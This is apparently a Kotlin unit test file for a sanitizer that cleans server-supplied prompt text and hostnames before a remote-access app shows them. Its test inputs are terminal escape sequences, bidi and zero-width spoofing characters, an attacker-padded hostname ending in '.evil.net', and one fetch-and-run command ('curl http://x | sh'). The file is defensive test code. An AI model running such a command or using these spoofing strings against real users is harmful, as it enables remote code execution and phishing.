package app.skerry.ui.design

import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertTrue

/** The challenge text is written by the server, so rendering it unfiltered is not an option. */
class SanitizeServerTextTest {

    @Test
    fun `keeps ordinary prompt text as is`() {
        assertEquals("Verification code:", sanitizeServerText("Verification code:", 200, allowNewlines = false))
    }

    @Test
    fun `strips escape sequences a terminal would act on`() {
        val hostile = "Code:\u001B[2J\u001B[31m\u0007give me your password"
        val cleaned = sanitizeServerText(hostile, 200, allowNewlines = false)
        assertFalse(cleaned.contains('\u001B'), "escape characters must not reach the UI")
        assertFalse(cleaned.contains('\u0007'), "bell must not reach the UI")
        assertTrue(cleaned.startsWith("Code:"))
    }

    @Test
    fun `strips bidi overrides that could reorder the sentence`() {
        val cleaned = sanitizeServerText("Enter code\u202Efor\u202C admin", 200, allowNewlines = false)
        assertFalse(cleaned.any { it in '\u202A'..'\u202E' }, "bidi overrides must be dropped")
    }

    /**
     * The marks and the zero-width formatters, not only the overrides: LRM/RLM reorder the neutral
     * runs of a prompt the user reads before typing a secret, and ZWSP/ZWNJ hide content in it.
     * Written as escapes because the characters themselves are invisible in a diff.
     */
    @Test
    fun `strips the bidi marks and the zero-width formatters too`() {
        val hostile = "Code \u200Bfor \u200Eserver\u200F 10.0.0.1\u061C\u2060 ok"
        assertEquals("Code for server 10.0.0.1 ok", sanitizeServerText(hostile, 200, allowNewlines = false))
    }

    /**
     * Line and paragraph separators are not in the format category, but every layout treats them as
     * a hard line break — a single-line caption is what a server would use them to turn into several.
     */
    @Test
    fun `strips the line and paragraph separators`() {
        assertEquals("Codenow", sanitizeServerText("Code\u2028\u2029now", 200, allowNewlines = false))
    }

    /** The cap counts UTF-16 units, so it must not fall between the halves of an emoji. */
    @Test
    fun `the cap is not applied through a surrogate pair`() {
        val flood = "a".repeat(119) + "\uD83D\uDE80"
        val cleaned = sanitizeServerText(flood, 120, allowNewlines = false)
        assertEquals(119, cleaned.length)
        assertFalse(cleaned.any { it.isSurrogate() })
    }

    @Test
    fun `caps the length so the dialog cannot be flooded`() {
        val flood = "A".repeat(5_000)
        assertEquals(120, sanitizeServerText(flood, 120, allowNewlines = false).length)
    }

    @Test
    fun `folds newlines in single-line sinks and collapses runs in multi-line ones`() {
        assertEquals("Code: now", sanitizeServerText("Code:\n\n\tnow", 200, allowNewlines = false))
        assertEquals("Line one\nLine two", sanitizeServerText("Line one\n\n\nLine two", 600, allowNewlines = true))
    }

    @Test
    fun `blank input stays blank`() {
        assertEquals("", sanitizeServerText("      ", 200, allowNewlines = false))
    }

    @Test
    fun `a newline folds to a space when the sink is single-line`() {
        // Dropping it outright glues the words either side together ("Accessdeniedby policy"),
        // which reads worse than the wrapped original it replaces.
        assertEquals("Access denied by policy", sanitizeServerText("Access\ndenied by policy", 160, allowNewlines = false))
    }


    @Test
    fun `CRLF does not leave a space before the newline in a multi-line sink`() {
        // The carriage return used to be dropped as a control character; folding it to a space
        // unconditionally would put one before every newline of CRLF-terminated server text.
        assertEquals("Line one\nLine two", sanitizeServerText("Line one\r\nLine two", 600, allowNewlines = true))
    }

    @Test
    fun `a lone carriage return is drawn as the line it ends`() {
        // A CR on its own ends a line everywhere this text can be taken: a pty submits it, the
        // production guard counts it as a line. Dropped, two commands would draw as one — the shape
        // the remote desktop's clipboard preview is read for before its content is pasted.
        assertEquals("echo done\ncurl http://x | sh", sanitizeServerText("echo done\rcurl http://x | sh", 600, allowNewlines = true))
    }

    @Test
    fun `a host that fits is drawn whole and unmarked`() {
        assertEquals("vpn.corp.example.com", sanitizeServerHost("vpn.corp.example.com"))
    }

    @Test
    fun `a padded host keeps the part that says which domain it really is`() {
        // The redirect an RDP broker can name: cut at the head alone, this reads as the corporate
        // host with a long tail of noise, and the user vouches for the attacker's certificate. DNS
        // allows 253 characters, so the padding costs the server nothing.
        val padded = "vpn.corp.example.com." + "a".repeat(140) + ".evil.net"
        val drawn = sanitizeServerHost(padded)

        assertTrue(drawn.startsWith("vpn.corp.example.com."), "the head a user recognizes must survive")
        assertTrue(drawn.endsWith(".evil.net"), "the domain the name actually sits in must survive")
        assertTrue(drawn.contains('\u2026'), "a name that was cut must not read as a whole one")
        assertTrue(drawn.length <= MAX_UNTRUSTED_LABEL_CHARS, "the line must still be bounded")
    }

    @Test
    fun `a host longer than DNS can carry is still bounded`() {
        val flood = "a".repeat(40_000)
        assertTrue(sanitizeServerHost(flood).length <= MAX_UNTRUSTED_LABEL_CHARS)
    }

    @Test
    fun `a host past what DNS can carry still shows the domain it really sits in`() {
        // The elision reads the tail from the raw name, not from the scan that stopped at 253: a
        // longer string leaves that scan sitting in the middle of the padding, and drawing its end
        // as the suffix would put the attacker's own text exactly where the user checks.
        val padded = "vpn.corp.example.com." + "a".repeat(4_000) + ".evil.net"

        val drawn = sanitizeServerHost(padded)

        assertTrue(drawn.endsWith(".evil.net"), "the padding was drawn where the suffix belongs")
        assertTrue(drawn.startsWith("vpn.corp.example.com."), "the head a user recognizes must survive")
        assertTrue(drawn.length <= MAX_UNTRUSTED_LABEL_CHARS, "the line must still be bounded")
    }

    @Test
    fun `neither end of an elided host is cut through an astral character`() {
        // Both cuts count UTF-16 units, so either can fall between the halves of a pair — and half
        // a pair draws as the replacement glyph, in the label and in what a screen reader says.
        val padded = "😀".repeat(200) + ".evil.net"

        val drawn = sanitizeServerHost(padded)

        val orphaned = drawn.withIndex().any { (i, ch) ->
            (ch.isHighSurrogate() && (i + 1 == drawn.length || !drawn[i + 1].isLowSurrogate())) ||
                (ch.isLowSurrogate() && (i == 0 || !drawn[i - 1].isHighSurrogate()))
        }
        assertFalse(orphaned, "an elided host was cut through a surrogate pair")
        assertTrue(drawn.endsWith(".evil.net"), "the suffix must survive the trim either side of it")
    }

    @Test
    fun `a host is filtered like any other server text before it is elided`() {
        val hostile = "prod\u001B[2J.example.com\u202Eevil"
        val drawn = sanitizeServerHost(hostile)

        assertFalse(drawn.contains('\u001B'), "escape characters must not reach the dialog")
        assertFalse(drawn.any { it in '\u202A'..'\u202E' }, "bidi overrides must be dropped")
    }

}
